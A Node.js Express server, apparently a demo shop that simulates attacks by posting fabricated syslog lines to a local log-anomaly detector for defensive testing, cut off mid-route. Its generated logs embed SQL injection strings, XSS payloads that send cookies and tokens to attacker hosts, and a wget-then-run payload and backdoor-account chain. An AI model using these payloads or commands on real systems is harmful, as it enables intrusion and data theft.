'use strict';

const express = require('express');
const fs = require('fs');
const http = require('http');
const path = require('path');

const app = express();
const PORT = 4000;
const LOG_SENTINEL_URL = 'http://localhost:8000/api/ingest';
const LOG_FILE = path.join(__dirname, 'access.log');

// Ensure log file exists
if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// ── Log format helpers ────────────────────────────────────────────────────────

// Apache Combined Log (for real browsing traffic written to access.log)
function apacheTimestamp() {
  const now = new Date();
  const pad = (n) => String(n).padStart(2, '0');
  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  return `${pad(now.getUTCDate())}/${months[now.getUTCMonth()]}/${now.getUTCFullYear()}:${pad(now.getUTCHours())}:${pad(now.getUTCMinutes())}:${pad(now.getUTCSeconds())} +0000`;
}

function makeApacheLine(ip, user, method, urlPath, status, bytes) {
  return `${ip} - ${user || '-'} [${apacheTimestamp()}] "${method} ${urlPath} HTTP/1.1" ${status} ${bytes}\n`;
}

// Syslog format (for attack simulations — matches the classifier's expected actions)
function syslogTimestamp(offsetSeconds = 0) {
  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  const d = new Date(Date.now() + offsetSeconds * 1000);
  const pad = (n) => String(n).padStart(2, '0');
  const day = String(d.getUTCDate()).padStart(2, ' ');
  return `${months[d.getUTCMonth()]} ${day} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
}

const HOST = 'web-prod-01';

function syslogFailed(ip, user, port, offsetSec = 0) {
  return `${syslogTimestamp(offsetSec)} ${HOST} sshd[${10000 + Math.floor(Math.random()*50000)}]: Failed password for ${user} from ${ip} port ${port} ssh2\n`;
}
function syslogAccepted(ip, user, port, offsetSec = 0) {
  return `${syslogTimestamp(offsetSec)} ${HOST} sshd[${10000 + Math.floor(Math.random()*50000)}]: Accepted password for ${user} from ${ip} port ${port} ssh2\n`;
}
function syslogSudo(user, command, offsetSec = 0) {
  return `${syslogTimestamp(offsetSec)} ${HOST} sudo[${10000 + Math.floor(Math.random()*50000)}]:  ${user} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=${command}\n`;
}
function syslogSession(action, user, offsetSec = 0) {
  return `${syslogTimestamp(offsetSec)} ${HOST} systemd-logind[${1000 + Math.floor(Math.random()*9000)}]: session ${action} for user ${user}\n`;
}

// Build ~60 normal syslog baseline lines so IsolationForest has context
function buildSyslogBaseline() {
  const users = ['deploy', 'alice', 'bob', 'charlie', 'www-data'];
  const normalIps = ['192.168.1.100', '192.168.1.101', '10.0.0.2'];
  let lines = '';
  for (let i = 0; i < 60; i++) {
    const u = users[i % users.length];
    const ip = normalIps[i % normalIps.length];
    lines += syslogSession('opened', u, -3600 + i * 30);
    if (i % 10 === 0) lines += syslogAccepted(ip, u, 22, -3600 + i * 30);
  }
  return lines;
}

// ── Known malicious IPs for realistic simulations ─────────────────────────────
const ATTACKER_IPS = [
  '185.220.101.34',   // Tor exit node
  '45.33.32.156',     // Shodan scanner
  '103.235.46.39',    // Known botnet
  '91.240.118.172',   // Russian APT
  '198.51.100.23',    // C2 server
  '23.129.64.210',    // Tor exit
  '171.25.193.77',    // Swedish VPN
  '62.102.148.68',    // Ukrainian proxy
  '185.56.83.83',     // Dutch datacenter
  '46.166.139.111',   // Moldovan hosting
];

function randomAttackerIP() {
  return ATTACKER_IPS[Math.floor(Math.random() * ATTACKER_IPS.length)];
}

// Post a standalone batch of log lines to Log Sentinel (no file accumulation)
function sendToSentinel(lines, targetUrl = '') {
  const body = JSON.stringify({ lines, target_url: targetUrl });
  const url = new URL(LOG_SENTINEL_URL);
  const options = {
    hostname: url.hostname,
    port: parseInt(url.port) || 80,
    path: url.pathname,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  };
  const req = http.request(options, (res) => {
    let d = '';
    res.on('data', c => d += c);
    res.on('end', () => {
      try {
        const r = JSON.parse(d);
        console.log(`[sentinel] new anomalies: ${r.new}, total: ${r.anomalies?.length}`);
      } catch {}
    });
  });
  req.on('error', (e) => console.error('[sentinel] ingest failed:', e.message));
  req.write(body);
  req.end();
}

// For real browsing: append to access.log (informational only, not sent to sentinel)
function writeAndSend(line) {
  fs.appendFile(LOG_FILE, line, () => {});
}

// ── Logging middleware (only for normal site routes) ──────────────────────────
function logRequest(req, res, next) {
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1')
    .split(',')[0].trim();
  res.on('finish', () => {
    const line = makeApacheLine(ip, req.user || '-', req.method, req.path, res.statusCode, 512);
    writeAndSend(line);
  });
  next();
}

// ── HTML helpers ──────────────────────────────────────────────────────────────
const layout = (title, body, extraHead = '') => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${title} — ShopEase</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Inter', system-ui, sans-serif; background: #0a0d14; color: #e2e8f0; }
    nav {
      background: rgba(15, 23, 42, 0.95);
      backdrop-filter: blur(12px);
      border-bottom: 1px solid rgba(129, 140, 248, 0.15);
      padding: 14px 32px;
      display: flex; align-items: center; justify-content: space-between;
      position: sticky; top: 0; z-index: 50;
    }
    nav a { color: #94a3b8; text-decoration: none; margin-left: 20px; font-size: 14px; font-weight: 500; transition: color 0.2s; }
    nav a:hover { color: #818cf8; }
    .brand { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; color: #e2e8f0; }
    .brand span { color: #818cf8; }
    .container { max-width: 960px; margin: 40px auto; padding: 0 20px; }
    .card {
      background: rgba(15, 23, 42, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.07);
      border-radius: 16px; padding: 32px;
      margin-bottom: 24px;
    }
    h1 { font-size: 22px; font-weight: 700; margin-bottom: 16px; color: #e2e8f0; }
    h2 { font-size: 16px; font-weight: 600; margin-bottom: 12px; color: #94a3b8; }
    input[type="text"], input[type="password"], input[type="url"] {
      width: 100%; padding: 12px 16px;
      border: 1.5px solid rgba(129, 140, 248, 0.2);
      border-radius: 12px; font-size: 14px; margin-bottom: 12px;
      background: rgba(15, 23, 42, 0.8); color: #e2e8f0;
      font-family: 'Inter', sans-serif;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    input:focus {
      outline: none;
      border-color: #818cf8;
      box-shadow: 0 0 0 3px rgba(129, 140, 248, 0.15);
    }
    input::placeholder { color: #475569; }
    button, .btn {
      display: inline-block; padding: 10px 22px;
      background: linear-gradient(135deg, #818cf8, #6366f1);
      color: #fff; border: none; border-radius: 999px;
      font-size: 14px; font-weight: 600; cursor: pointer;
      text-decoration: none; transition: all 0.2s;
      box-shadow: 0 4px 14px rgba(99, 102, 241, 0.4);
      font-family: 'Inter', sans-serif;
    }
    button:hover, .btn:hover {
      transform: translateY(-2px) scale(1.02);
      box-shadow: 0 8px 24px rgba(99, 102, 241, 0.55);
    }
    .btn-red { background: linear-gradient(135deg, #fb7185, #e11d48); box-shadow: 0 4px 14px rgba(225, 29, 72, 0.4); }
    .btn-red:hover { box-shadow: 0 8px 24px rgba(225, 29, 72, 0.55); }
    .btn-orange { background: linear-gradient(135deg, #fb923c, #ea580c); box-shadow: 0 4px 14px rgba(234, 88, 12, 0.4); }
    .btn-orange:hover { box-shadow: 0 8px 24px rgba(234, 88, 12, 0.55); }
    .btn-yellow { background: linear-gradient(135deg, #fbbf24, #d97706); box-shadow: 0 4px 14px rgba(217, 119, 6, 0.4); color: #1e293b; }
    .btn-yellow:hover { box-shadow: 0 8px 24px rgba(217, 119, 6, 0.55); }
    .btn-violet { background: linear-gradient(135deg, #a78bfa, #7c3aed); box-shadow: 0 4px 14px rgba(124, 58, 237, 0.4); }
    .btn-violet:hover { box-shadow: 0 8px 24px rgba(124, 58, 237, 0.55); }
    .btn-teal { background: linear-gradient(135deg, #2dd4bf, #0d9488); box-shadow: 0 4px 14px rgba(20, 184, 166, 0.4); }
    .btn-teal:hover { box-shadow: 0 8px 24px rgba(20, 184, 166, 0.55); }
    .alert-box {
      padding: 12px 16px; border-radius: 12px; font-size: 14px; margin-bottom: 16px;
    }
    .alert-error { background: rgba(225, 29, 72, 0.1); color: #fb7185; border: 1px solid rgba(225, 29, 72, 0.25); }
    .alert-success { background: rgba(34, 197, 94, 0.1); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.25); }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; }
    .product {
      background: rgba(15, 23, 42, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.07);
      border-radius: 14px; padding: 20px; text-align: center;
      transition: all 0.2s;
    }
    .product:hover { border-color: rgba(129, 140, 248, 0.25); transform: translateY(-2px); }
    .product-img { font-size: 48px; margin-bottom: 12px; }
    .product-name { font-weight: 600; font-size: 14px; margin-bottom: 4px; color: #e2e8f0; }
    .product-price { color: #818cf8; font-weight: 700; }
    .simulate-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 16px; }
    .sim-card {
      background: rgba(15, 23, 42, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.07);
      border-radius: 14px; padding: 20px;
      transition: all 0.2s;
    }
    .sim-card:hover { border-color: rgba(129, 140, 248, 0.2); }
    .sim-card h3 { font-size: 14px; font-weight: 700; margin-bottom: 6px; color: #e2e8f0; }
    .sim-card p { font-size: 12px; color: #64748b; margin-bottom: 14px; }
    #status { margin-top: 16px; font-size: 13px; color: #94a3b8; min-height: 20px; }
    .pill {
      display: inline-block; padding: 3px 12px; border-radius: 999px;
      font-size: 11px; font-weight: 600; margin-left: 8px;
    }
    .pill-red { background: rgba(225, 29, 72, 0.15); color: #fb7185; }
    .pill-orange { background: rgba(234, 88, 12, 0.15); color: #fb923c; }
    .pill-indigo { background: rgba(99, 102, 241, 0.15); color: #818cf8; }

    /* Attack page styles */
    .attack-hero {
      text-align: center;
      padding: 40px 20px 30px;
    }
    .attack-hero h1 {
      font-size: 32px; font-weight: 800; margin-bottom: 8px;
      background: linear-gradient(135deg, #fb7185, #f43f5e, #e11d48);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .attack-hero p { color: #64748b; font-size: 14px; max-width: 500px; margin: 0 auto; }
    .url-input-group {
      display: flex; gap: 12px; align-items: center;
      max-width: 600px; margin: 24px auto 32px;
    }
    .url-input-group input {
      flex: 1; margin: 0; padding: 14px 18px;
      font-size: 15px; border-radius: 14px;
    }
    .url-input-group button {
      white-space: nowrap; padding: 14px 24px;
    }
    .target-badge {
      display: inline-flex; align-items: center; gap: 8px;
      background: rgba(99, 102, 241, 0.1);
      border: 1px solid rgba(129, 140, 248, 0.25);
      border-radius: 999px; padding: 8px 18px;
      font-size: 13px; color: #818cf8; font-weight: 600;
      margin-bottom: 24px;
    }
    .target-badge .dot {
      width: 8px; height: 8px; border-radius: 50%;
      background: #4ade80;
      box-shadow: 0 0 8px rgba(74, 222, 128, 0.5);
      animation: pulse 2s ease-in-out infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.6; transform: scale(1.3); }
    }
    .attack-log {
      background: rgba(15, 23, 42, 0.8);
      border: 1px solid rgba(255, 255, 255, 0.07);
      border-radius: 12px; padding: 16px;
      font-family: 'JetBrains Mono', monospace; font-size: 12px;
      color: #64748b; max-height: 200px; overflow-y: auto;
      margin-top: 16px; white-space: pre-wrap;
    }
    .attack-log .entry-critical { color: #fb7185; }
    .attack-log .entry-high { color: #fb923c; }
    .attack-log .entry-medium { color: #fbbf24; }
    .attack-log .entry-ok { color: #4ade80; }
  </style>
  ${extraHead}
</head>
<body>
  <nav>
    <span class="brand">🛒 Shop<span>Ease</span></span>
    <div>
      <a href="/">Home</a>
      <a href="/products">Products</a>
      <a href="/dashboard">Dashboard</a>
      <a href="/admin">Admin</a>
      <a href="/login">Login</a>
      <a href="/attack" style="color:#fb7185;font-weight:700">🎯 Attack</a>
      <a href="/simulate" style="color:#fbbf24;font-weight:700">⚡ Simulate</a>
    </div>
  </nav>
  <div class="container">${body}</div>
</body>
</html>`;

// ── Routes ────────────────────────────────────────────────────────────────────

app.get('/', logRequest, (req, res) => {
  res.send(layout('Home', `
    <div class="card">
      <h1>Welcome to ShopEase</h1>
      <p style="color:#64748b;margin-bottom:20px">Your one-stop shop for everything.</p>
      <a class="btn" href="/products">Browse Products</a>
      <a class="btn" href="/login" style="margin-left:12px;background:linear-gradient(135deg,#475569,#334155);box-shadow:0 4px 10px rgba(0,0,0,0.3)">Login</a>
    </div>
    <div class="grid">
      <div class="product"><div class="product-img">💻</div>
        <div class="product-name">Laptop Pro</div><div class="product-price">$999</div></div>
      <div class="product"><div class="product-img">📱</div>
        <div class="product-name">Phone X</div><div class="product-price">$699</div></div>
      <div class="product"><div class="product-img">🎧</div>
        <div class="product-name">Headphones</div><div class="product-price">$199</div></div>
      <div class="product"><div class="product-img">⌚</div>
        <div class="product-name">Smartwatch</div><div class="product-price">$349</div></div>
    </div>
  `));
});

app.get('/products', logRequest, (req, res) => {
  res.send(layout('Products', `
    <div class="card"><h1>All Products</h1></div>
    <div class="grid">
      ${['💻 Laptop $999','📱 Phone $699','🎧 Headphones $199','⌚ Watch $349',
         '🖥️ Monitor $449','⌨️ Keyboard $89','🖱️ Mouse $49','📷 Camera $599']
        .map(p => {
          const [icon, ...rest] = p.split(' ');
          return `<div class="product"><div class="product-img">${icon}</div>
            <div class="product-name">${rest.slice(0,-1).join(' ')}</div>
            <div class="product-price">${rest.at(-1)}</div></div>`;
        }).join('')}
    </div>
  `));
});

app.get('/login', logRequest, (req, res) => {
  const err = req.query.error;
  res.send(layout('Login', `
    <div class="card" style="max-width:400px;margin:0 auto">
      <h1>Sign In</h1>
      ${err ? `<div class="alert-box alert-error">Invalid username or password.</div>` : ''}
      <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" style="width:100%">Login</button>
      </form>
    </div>
  `));
});

app.post('/login', logRequest, (req, res) => {
  const { username, password } = req.body;
  if (username === 'admin' && password === 'secret123') {
    res.send(layout('Login', `
      <div class="card" style="max-width:400px;margin:0 auto">
        <div class="alert-box alert-success">✅ Logged in as admin</div>
        <a class="btn" href="/dashboard">Go to Dashboard</a>
      </div>
    `));
  } else {
    res.redirect('/login?error=1');
  }
});

app.get('/dashboard', logRequest, (req, res) => {
  res.send(layout('Dashboard', `
    <div class="card"><h1>User Dashboard</h1>
      <p style="color:#64748b">Welcome back! Here are your recent orders.</p>
    </div>
    <div class="card"><h2>Recent Orders</h2>
      <p style="font-size:14px;color:#64748b">No orders yet.</p>
    </div>
  `));
});

app.get('/admin', logRequest, (req, res) => {
  res.status(403).send(layout('Admin', `
    <div class="card">
      <h1>403 — Forbidden <span class="pill pill-red">RESTRICTED</span></h1>
      <p style="color:#64748b">Administrator access only.</p>
    </div>
  `));
});

app.get('/api/data', logRequest, (req, res) => {
  res.json({ products: 42, users: 1337, revenue: '$128,400' });
});

// ══════════════════════════════════════════════════════════════════════════════
//  🎯 ATTACK PAGE — Target any website with simulated attacks
// ══════════════════════════════════════════════════════════════════════════════

app.get('/attack', (req, res) => {
  res.send(layout('Attack Target', `
    <div class="attack-hero">
      <h1>🎯 Attack Simulator</h1>
      <p>
        Enter any website URL and simulate real-world cyberattacks.
        RedFlag will detect anomalies, trace attacker IPs, and generate AI-powered threat reports in real-time.
      </p>
    </div>

    <div class="card" style="text-align:center">
      <h2 style="color:#e2e8f0;margin-bottom:4px">Target Website</h2>
      <p style="font-size:12px;color:#64748b;margin-bottom:16px">Enter the URL of the website you want to attack (simulation only — no actual traffic is sent)</p>

      <div class="url-input-group">
        <input type="url" id="targetUrl" placeholder="https://amazon.com" value="https://amazon.com">
        <button class="btn-red" onclick="lockTarget()">🔒 Lock Target</button>
      </div>

      <div id="targetBadge" style="display:none">
        <div class="target-badge">
          <span class="dot"></span>
          <span>TARGET LOCKED: <strong id="targetDisplay"></strong></span>
        </div>
      </div>
    </div>

    <div id="attackPanel" style="display:none">
      <div class="card">
        <h2 style="color:#e2e8f0;margin-bottom:4px">Choose Attack Vector</h2>
        <p style="font-size:12px;color:#64748b;margin-bottom:20px">
          Each attack injects realistic malicious log lines into RedFlag's live monitor.
          Open <code style="color:#818cf8">localhost:3000</code> → Live Monitor to watch detections in real-time.
        </p>

        <div class="simulate-grid">
          <div class="sim-card">
            <h3>🔨 SSH Brute Force</h3>
            <p>40 rapid failed SSH login attempts from Tor exit nodes targeting the server hosting <span class="attack-target-name"></span></p>
            <button class="btn-red" onclick="attack('brute-force')">Launch Attack</button>
          </div>
          <div class="sim-card">
            <h3>💉 SQL Injection</h3>
            <p>Malicious SQL payloads injected into login forms and search queries on <span class="attack-target-name"></span></p>
            <button class="btn-orange" onclick="attack('sql-injection')">Launch Attack</button>
          </div>
          <div class="sim-card">
            <h3>🔐 Privilege Escalation</h3>
            <p>Attacker gains www-data shell, escalates to root via sudo on the server behind <span class="attack-target-name"></span></p>
            <button class="btn-orange" onclick="attack('privesc')">Launch Attack</button>
          </div>
          <div class="sim-card">
            <h3>🌐 DDoS Flood</h3>
            <p>Distributed denial-of-service — 100+ requests/sec from a botnet targeting <span class="attack-target-name"></span></p>
            <button class="btn-red" onclick="attack('ddos')">Launch Attack</button>
          </div>
          <div class="sim-card">
            <h3>🔍 Port Scan</h3>
            <p>Reconnaissance scan probing 20+ ports on the server infrastructure of <span class="attack-target-name"></span></p>
            <button class="btn-yellow" onclick="attack('portscan')">Launch Attack</button>
          </div>
          <div class="sim-card">
            <h3>🌍 Impossible Travel</h3>
            <p>Admin logs in from US, then Moscow 2 min later — credential theft on <span class="attack-target-name"></span></p>
            <button class="btn-violet" onclick="attack('travel')">Launch Attack</button>
          </div>
          <div class="sim-card">
            <h3>🕷️ XSS + Data Exfil</h3>
            <p>Cross-site scripting payload followed by data exfiltration from <span class="attack-target-name"></span></p>
            <button class="btn-orange" onclick="attack('xss-exfil')">Launch Attack</button>
          </div>
          <div class="sim-card">
            <h3>💣 Full Chain Attack</h3>
            <p>Complete kill chain: recon → exploit → escalate → persist → exfil on <span class="attack-target-name"></span></p>
            <button class="btn-red" onclick="attack('full-chain')">Launch Attack</button>
          </div>
        </div>
      </div>

      <div id="status"></div>
      <div id="attackLog" class="attack-log" style="display:none"></div>
    </div>

    <script>
      let currentTarget = '';

      function lockTarget() {
        const input = document.getElementById('targetUrl');
        const url = input.value.trim();
        if (!url) { alert('Please enter a URL'); return; }

        currentTarget = url;
        // Extract domain for display
        try {
          const domain = new URL(url.startsWith('http') ? url : 'https://' + url).hostname;
          document.getElementById('targetDisplay').textContent = domain;
        } catch {
          document.getElementById('targetDisplay').textContent = url;
        }

        document.getElementById('targetBadge').style.display = 'block';
        document.getElementById('attackPanel').style.display = 'block';

        // Update all attack target name spans
        document.querySelectorAll('.attack-target-name').forEach(el => {
          el.textContent = currentTarget;
          el.style.color = '#818cf8';
          el.style.fontWeight = '600';
        });

        input.style.borderColor = '#4ade80';
        input.style.boxShadow = '0 0 0 3px rgba(74, 222, 128, 0.15)';
      }

      async function attack(type) {
        const el = document.getElementById('status');
        const logEl = document.getElementById('attackLog');
        el.innerHTML = '<span style="color:#fbbf24">⏳ Launching attack against ' + currentTarget + '...</span>';
        logEl.style.display = 'block';
        logEl.innerHTML = '<span class="entry-medium">[' + new Date().toLocaleTimeString() + '] Initiating ' + type + ' attack on ' + currentTarget + '...</span>\\n';

        try {
          const r = await fetch('/attack/' + type, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target_url: currentTarget }),
          });
          const d = await r.json();
          el.innerHTML = '<span style="color:#4ade80">✅ ' + d.message + '</span>';

          // Log the attack details
          if (d.log_lines) {
            d.log_lines.forEach(line => {
              const severity = line.includes('CRITICAL') || line.includes('Failed') ? 'entry-critical' :
                               line.includes('HIGH') || line.includes('sudo') ? 'entry-high' :
                               line.includes('Accepted') ? 'entry-ok' : 'entry-medium';
              logEl.innerHTML += '<span class="' + severity + '">' + line.trim() + '</span>\\n';
            });
          }
          logEl.scrollTop = logEl.scrollHeight;
        } catch(e) {
          el.innerHTML = '<span style="color:#fb7185">❌ Error: ' + e.message + '</span>';
        }
      }
    </script>
  `, '<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">'));
});

// ── Attack endpoints — generate logs referencing the target URL ────────────────

function extractDomain(url) {
  try {
    return new URL(url.startsWith('http') ? url : 'https://' + url).hostname;
  } catch {
    return url;
  }
}

app.post('/attack/brute-force', (req, res) => {
  const targetUrl = req.body.target_url || 'https://example.com';
  const domain = extractDomain(targetUrl);
  const ip = randomAttackerIP();
  let lines = buildSyslogBaseline();
  const logLines = [];

  // 40 rapid failed logins
  for (let i = 0; i < 40; i++) {
    const line = `${syslogTimestamp(i * 2)} ${domain} sshd[${10000 + Math.floor(Math.random()*50000)}]: Failed password for root from ${ip} port 22 ssh2`;
    lines += line + '\n';
    if (i < 5 || i === 39) logLines.push(line);
  }
  // Success after brute force
  const successLine = `${syslogTimestamp(82)} ${domain} sshd[${10000 + Math.floor(Math.random()*50000)}]: Accepted password for root from ${ip} port 22 ssh2`;
  lines += successLine + '\n';
  logLines.push(successLine);

  sendToSentinel(lines, targetUrl);
  res.json({
    message: `40 failed SSH logins + 1 successful breach injected against ${domain} from ${ip}`,
    log_lines: logLines,
  });
});

app.post('/attack/sql-injection', (req, res) => {
  const targetUrl = req.body.target_url || 'https://example.com';
  const domain = extractDomain(targetUrl);
  const ip = randomAttackerIP();
  let lines = buildSyslogBaseline();
  const logLines = [];

  const payloads = [
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM admin_users --",
    "1; EXEC xp_cmdshell('whoami')",
    "' AND 1=1 UNION SELECT username,password FROM users --",
    "admin'--",
    "' OR 1=1#",
    "1 AND (SELECT COUNT(*) FROM sysobjects)>0",
  ];

  payloads.forEach((payload, i) => {
    const line = `${syslogTimestamp(i * 3)} ${domain} webapp[${20000 + Math.floor(Math.random()*30000)}]: SQL_INJECTION_ATTEMPT from ${ip} payload="${payload}" path=/login status=403`;
    lines += line + '\n';
    logLines.push(line);
  });

  // Some succeed
  const successLine = `${syslogTimestamp(30)} ${domain} webapp[${20000 + Math.floor(Math.random()*30000)}]: SQL_INJECTION_SUCCESS from ${ip} payload="' UNION SELECT * FROM admin_users --" rows_leaked=847 path=/api/search`;
  lines += successLine + '\n';
  logLines.push(successLine);

  sendToSentinel(lines, targetUrl);
  res.json({
    message: `${payloads.length} SQL injection payloads + 1 data breach injected against ${domain}`,
    log_lines: logLines,
  });
});

app.post('/attack/privesc', (req, res) => {
  const targetUrl = req.body.target_url || 'https://example.com';
  const domain = extractDomain(targetUrl);
  let lines = buildSyslogBaseline();
  const logLines = [];

  const steps = [
    { cmd: syslogAccepted('10.0.0.5', 'www-data', 4444, 0), desc: 'Initial shell access' },
    { cmd: `${syslogTimestamp(2)} ${domain} sudo[${Math.floor(Math.random()*50000)}]:  www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.1/payload.sh\n`, desc: 'Download payload' },
    { cmd: `${syslogTimestamp(4)} ${domain} sudo[${Math.floor(Math.random()*50000)}]:  www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/payload.sh\n`, desc: 'Execute payload' },
    { cmd: `${syslogTimestamp(6)} ${domain} sudo[${Math.floor(Math.random()*50000)}]:  www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 backdoor\n`, desc: 'Create backdoor account' },
    { cmd: `${syslogTimestamp(8)} ${domain} sudo[${Math.floor(Math.random()*50000)}]:  www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod 4755 /tmp/shell\n`, desc: 'SUID shell' },
    { cmd: `${syslogTimestamp(10)} ${domain} sudo[${Math.floor(Math.random()*50000)}]:  www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -e\n`, desc: 'Persistence via cron' },
  ];

  steps.forEach(s => {
    lines += s.cmd;
    logLines.push(s.cmd.trim());
  });

  sendToSentinel(lines, targetUrl);
  res.json({
    message: `Privilege escalation chain injected against ${domain} (www-data → root)`,
    log_lines: logLines,
  });
});

app.post('/attack/ddos', (req, res) => {
  const targetUrl = req.body.target_url || 'https://example.com';
  const domain = extractDomain(targetUrl);
  let lines = buildSyslogBaseline();
  const logLines = [];

  // 30 botnet IPs hitting simultaneously
  const botnetIps = Array.from({ length: 30 }, () =>
    `${Math.floor(Math.random()*223)+1}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
  );

  botnetIps.forEach((ip, i) => {
    // Each IP sends 3-5 rapid requests
    const reqCount = 3 + Math.floor(Math.random() * 3);
    for (let j = 0; j < reqCount; j++) {
      const line = `${syslogTimestamp(i + j)} ${domain} nginx[${30000 + Math.floor(Math.random()*20000)}]: ${ip} - - "GET / HTTP/1.1" 503 0 rate_limit_exceeded connections=${100 + i * 4}`;
      lines += line + '\n';
      if (i < 3 && j === 0) logLines.push(line);
    }
  });

  // Server crash entry
  const crashLine = `${syslogTimestamp(35)} ${domain} kernel: Out of memory: Kill process nginx (nginx) score 950 or sacrifice child`;
  lines += crashLine + '\n';
  logLines.push(crashLine);

  sendToSentinel(lines, targetUrl);
  res.json({
    message: `DDoS flood injected: ${botnetIps.length} botnet IPs, ~120 requests against ${domain}`,
    log_lines: logLines,
  });
});

app.post('/attack/portscan', (req, res) => {
  const targetUrl = req.body.target_url || 'https://example.com';
  const domain = extractDomain(targetUrl);
  const ip = randomAttackerIP();
  let lines = buildSyslogBaseline();
  const logLines = [];

  const ports = [21,22,23,25,53,80,110,143,443,445,993,995,1433,3306,3389,5432,5900,6379,8080,8443,9200,27017];
  ports.forEach((port, i) => {
    const line = syslogFailed(ip, 'root', port, i);
    lines += line;
    if (i < 5 || i === ports.length - 1) logLines.push(line.trim());
  });

  sendToSentinel(lines, targetUrl);
  res.json({
    message: `${ports.length}-port reconnaissance scan injected against ${domain} from ${ip}`,
    log_lines: logLines,
  });
});

app.post('/attack/travel', (req, res) => {
  const targetUrl = req.body.target_url || 'https://example.com';
  const domain = extractDomain(targetUrl);
  let lines = buildSyslogBaseline();
  const logLines = [];

  // Admin from US
  const usLine = `${syslogTimestamp(0)} ${domain} sshd[${10000 + Math.floor(Math.random()*50000)}]: Accepted password for admin from 72.21.198.66 port 443 ssh2`;
  lines += usLine + '\n';
  logLines.push(usLine);

  lines += syslogSession('opened', 'admin', 1);
  logLines.push(`[+1s] Session opened for admin (US IP: 72.21.198.66)`);

  // 2 min later from Moscow
  const moscowLine = `${syslogTimestamp(120)} ${domain} sshd[${10000 + Math.floor(Math.random()*50000)}]: Accepted password for admin from 95.173.136.70 port 443 ssh2`;
  lines += moscowLine + '\n';
  logLines.push(moscowLine);

  lines += syslogSession('opened', 'admin', 121);
  logLines.push(`[+121s] Session opened for admin (Moscow IP: 95.173.136.70)`);

  sendToSentinel(lines, targetUrl);
  res.json({
    message: `Impossible travel injected: admin logged in from US → Moscow in 2 minutes on ${domain}`,
    log_lines: logLines,
  });
});

app.post('/attack/xss-exfil', (req, res) => {
  const targetUrl = req.body.target_url || 'https://example.com';
  const domain = extractDomain(targetUrl);
  const ip = randomAttackerIP();
  let lines = buildSyslogBaseline();
  const logLines = [];

  // XSS attempts
  const xssPayloads = [
    `<script>document.location='http://${ip}:9999/steal?c='+document.cookie</script>`,
    `<img src=x onerror=fetch('http://${ip}/exfil?t='+localStorage.getItem('token'))>`,
    `<svg onload=eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9ldmlsLmNvbS9zdGVhbCc='))>`,
  ];

  xssPayloads.forEach((payload, i) => {
    const line = `${syslogTimestamp(i * 5)} ${domain} webapp[${20000 + Math.floor(Math.random()*30000)}]: XSS_ATTEMPT from ${ip} payload="${payload}" path=/search`;
    lines += line + '\n';
    logLines.push(line);
  });

  // Data exfiltration
  const exfilLine = `${syslogTimestamp(20)} ${domain} webapp[${20000 + Math.floor(Math.random()*30000)}]: DATA_EXFILTRATION from ${ip} destination=http://${ip}:9999/collect bytes_sent=2457600 records=12400`;
  lines += exfilLine + '\n';
  logLines.push(exfilLine);

  sendToSentinel(lines, targetUrl);
  res.json({
    message: `XSS + data exfiltration injected against ${domain}: 12,400 records stolen`,
    log_lines: logLines,
  });
});

app.post('/attack/full-chain', (req, res) => {
  const targetUrl = req.body.target_url || 'https://example.com';
  const domain = extractDomain(targetUrl);
  const ip = randomAttackerIP();
  let lines = buildSyslogBaseline();
  const logLines = [];

  // Phase 1: Reconnaissance
  const ports = [21,22,80,443,3306,8080,8443,9200];
  ports.forEach((port, i) => {
    lines += syslogFailed(ip, 'root', port, i);
  });
  logLines.push(`[RECON] Port scan of ${ports.length} ports from ${ip}`);

  // Phase 2: Brute force
  for (let i = 0; i < 25; i++) {
    lines += `${syslogTimestamp(10 + i * 2)} ${domain} sshd[${10000 + Math.floor(Math.random()*50000)}]: Failed password for root from ${ip} port 22 ssh2\n`;
  }
  logLines.push(`[EXPLOIT] 25 brute-force attempts against ${domain}`);

  // Phase 3: Successful breach
